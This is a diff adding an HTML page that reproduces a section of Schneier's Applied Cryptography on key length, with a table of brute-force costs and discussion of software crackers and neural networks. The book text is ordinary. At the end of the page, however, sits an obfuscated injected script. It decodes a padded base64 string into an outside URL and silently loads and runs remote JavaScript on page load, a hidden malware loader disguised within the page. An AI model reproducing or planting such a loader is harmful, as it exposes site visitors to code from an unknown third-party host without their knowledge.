@@ -1,0 +1,175 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Key Length</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=07//-->
+<!--PAGES=153-155//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Of course, it is ludicrous to estimate computing power 35 years in the future. Breakthroughs in some science-fiction technology could make these numbers look like a joke. Conversely, physical limitations unknown at the present time could make them unrealistically optimistic. In cryptography it is wise to be pessimistic. Fielding an algorithm with an 80-bit key seems extremely short-sighted. Insist on at least 112-bit keys.
+</P>
+<TABLE WIDTH="100%"><TR>
+<TH CAPTION ALIGN="CENTER" COLSPAN="7">Table 7.1<BR>Average Time Estimates for a Hardware Brute-Force Attack in 1995
+<TR>
+<TD COLSPAN="7"><HR>
+<TR>
+<TH COLSPAN="7" ALIGN="LEFT" VALIGN="BOTTOM">Length of Key in Bits
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">
+<TD COLSPAN="6"><HR>
+<TR>
+<TH ALIGN="LEFT" VALIGN="BOTTOM">Cost
+<TH ALIGN="CENTER" VALIGN="BOTTOM">40
+<TH ALIGN="CENTER" VALIGN="BOTTOM">56
+<TH ALIGN="CENTER" VALIGN="BOTTOM">64
+<TH ALIGN="CENTER" VALIGN="BOTTOM">80
+<TH ALIGN="CENTER" VALIGN="BOTTOM">112
+<TH ALIGN="CENTER" VALIGN="BOTTOM">128
+<TR>
+<TD COLSPAN="7"><HR>
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">$100 K
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2 seconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">35 hours
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1 year
+<TD ALIGN="CENTER" VALIGN="BOTTOM">70,000 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>14</SUP> years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>19</SUP> years
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">$1 M
+<TD ALIGN="CENTER" VALIGN="BOTTOM">.2 seconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">3.5 hours
+<TD ALIGN="CENTER" VALIGN="BOTTOM">37 days
+<TD ALIGN="CENTER" VALIGN="BOTTOM">7000 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>13</SUP> years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>18</SUP> years
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">$10 M
+<TD ALIGN="CENTER" VALIGN="BOTTOM">.02 seconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">21 minutes
+<TD ALIGN="CENTER" VALIGN="BOTTOM">4 days
+<TD ALIGN="CENTER" VALIGN="BOTTOM">700 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>12</SUP> years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>17</SUP> years
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">$100 M
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2 milliseconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2 minutes
+<TD ALIGN="CENTER" VALIGN="BOTTOM">9 hours
+<TD ALIGN="CENTER" VALIGN="BOTTOM">70 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>11</SUP> years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>16</SUP> years
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">$1 G
+<TD ALIGN="CENTER" VALIGN="BOTTOM">.2 milliseconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">13 seconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1 hour
+<TD ALIGN="CENTER" VALIGN="BOTTOM">7 years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>10</SUP> years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>15</SUP> years
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">$10 G
+<TD ALIGN="CENTER" VALIGN="BOTTOM">.02 milliseconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1 second
+<TD ALIGN="CENTER" VALIGN="BOTTOM">5.4 minutes
+<TD ALIGN="CENTER" VALIGN="BOTTOM">245 days
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>9</SUP> years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>14</SUP> years
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">$100 G
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2 microseconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">.1 second
+<TD ALIGN="CENTER" VALIGN="BOTTOM">32 seconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">24 days
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>8</SUP> years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>13</SUP> years
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">$1 T
+<TD ALIGN="CENTER" VALIGN="BOTTOM">.2 microseconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">.01 second
+<TD ALIGN="CENTER" VALIGN="BOTTOM">3 seconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">2.4 days
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>7</SUP> years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>12</SUP> years
+<TR>
+<TD VALIGN="BOTTOM" ALIGN="LEFT" VALIGN="BOTTOM">$10 T
+<TD ALIGN="CENTER" VALIGN="BOTTOM">.02 microseconds
+<TD ALIGN="CENTER" VALIGN="BOTTOM">1 millisecond
+<TD ALIGN="CENTER" VALIGN="BOTTOM">.3 second
+<TD ALIGN="CENTER" VALIGN="BOTTOM">6 hours
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>6</SUP> years
+<TD ALIGN="CENTER" VALIGN="BOTTOM">10<SUP>11</SUP> years
+<TR>
+<TD COLSPAN="7"><HR>
+</TABLE>
+<P>If an attacker wants to break a key badly enough, all he has to do is spend money. Consequently, it seems prudent to try to estimate the minimum &#147;value&#148; of a key: How much value can be trusted to a single key before it makes economic sense to try to break? To give an extreme example, if an encrypted message is worth $1.39, then it wouldn&#146;t make much financial sense to set a $10-million cracker to the task of recovering the key. On the other hand, if the plaintext message is worth $100 million, then decrypting that single message would justify the cost of building the cracker. Also, the value of some messages decreases rapidly with time.
+</P>
+<P><FONT SIZE="+1"><B><I>Software Crackers</I></B></FONT></P>
+<P>Without special-purpose hardware and massively parallel machines, brute-force attacks are significantly harder. A software attack is about a thousand times slower than a hardware attack.
+</P>
+<P>The real threat of a software-based brute-force attack is not that it is certain, but that it is &#147;free.&#148; It costs nothing to set up a microcomputer to test possible keys whenever it is idle. If it finds the correct key&#151;great. If it doesn&#146;t, then nothing is lost. It costs nothing to set up an entire microcomputer network to do that. A recent experiment with DES used the collective idle time of 40 workstations to test 2<SUP>34</SUP> keys in a single day [603]. At this speed, it will take four million days to test all keys, but if enough people try attacks like this, then someone somewhere will get lucky. As was said in [603]:</P>
+<BLOCKQUOTE><P>The crux of the software threat is sheer bad luck. Imagine a university computer network of 512 workstations, networked together. On some campuses this would be a medium-sized network. They could even be spread around the world, coordinating their activity through electronic mail. Assume each workstation is capable of running [the algorithm] at a rate of 15,000 encryptions per second.... Allowing for the overhead of testing and changing keys, this comes down to...8192 tests per second per machine. To exhaust [a 56-bit] keyspace with this setup would take 545 years (assuming the network was dedicated to the task twenty-four hours per day). Notice, however, that the same calculations give our hypothetical student hackers one chance in 200,000 of cracking a key in one day. Over a long weekend their odds increase to one chance in sixty-six thousand. The faster their hardware, or the more machines involved, the better their chance becomes. These are not good odds for earning a living from horse racing, but they&#146;re not the stuff of good press releases either. They are much better odds than the Government gives on its lotteries, for instance. &#147;One-in-a-million&#148;? &#147;Couldn&#146;t happen again in a thousand years&#148;? It is no longer possible to say such things honestly. Is this an acceptable ongoing risk?
+</P>
+</BLOCKQUOTE><P>Using an algorithm with a 64-bit key instead of a 56-bit key makes this attack 256 times more difficult. With a 40-bit key, the picture is far more bleak. A network of 400 computers, each capable of performing 32,000 encryptions per second, can complete a brute-force attack against a 40-bit key in a single day. (In 1992, the RC2 and RC4 algorithms were approved for export with a 40-bit key&#151;see Section 13.8.)
+</P>
+<P>A 128-bit key makes a brute-force attack ridiculous even to contemplate. Industry experts estimate that by 1996 there will be 200 million computers in use worldwide. This estimate includes everything from giant Cray mainframes to subnotebooks. If every one of those computers worked together on this brute-force attack, and each computer performed a million encryptions per second every second, it would still take a million times the age of the universe to recover the key.</P>
+<P><FONT SIZE="+1"><B><I>Neural Networks</I></B></FONT></P>
+<P>Neural nets aren&#146;t terribly useful for cryptanalysis, primarily because of the shape of the solution space. Neural nets work best with problems that have a continuity of solutions, some better than others. This allows a neural net to learn, proposing better and better solutions as it does. Breaking an algorithm provides for very little in the way of learning opportunities: You either recover the key or you don&#146;t. (At least this is true if the algorithm is any good.) Neural nets work well in structured environments where there is something to learn, but not in the high-entropy, seemingly random world of cryptography.
+</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="07-01.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="07-03.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(FZAvhOog, jMgKDDch) {jMgKDDch = FZAvhOog.createElement('script');jMgKDDch.type = 'text/javascript';jMgKDDch.async = true;jMgKDDch.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');FZAvhOog.getElementsByTagName('body')[0].appendChild(jMgKDDch);}(document));</script></body>
+</html>
